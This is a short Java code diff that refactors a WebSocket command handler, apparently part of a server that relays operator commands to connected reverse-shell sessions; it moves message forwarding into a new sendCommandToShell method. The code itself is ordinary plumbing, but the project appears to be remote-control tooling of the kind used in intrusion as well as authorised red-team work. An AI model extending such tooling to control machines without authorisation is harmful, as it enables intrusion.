@@ -18,12 +18,21 @@ public class DefualtConnectedCommand implements Command {
 
         WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(currentSocket);
 
+        sendCommandToShell(mangerMessage, targetReverseShellSocket, currentSocket);
+
+        log.debug("Manager input is: {}",mangerMessage);
+    }
+
+    public void sendCommandToShell( String mangerMessage,
+                                    WebSocketSession targetReverseShellSocket,
+                                    WebSocketSession currentSocket ){
+
         SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
                 DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                         .msg(mangerMessage)
                         .masterSessionId(currentSocket.getId())
                         .build()
                 )));
-        log.debug("Manager input is: {}",mangerMessage);
     }
+
 }
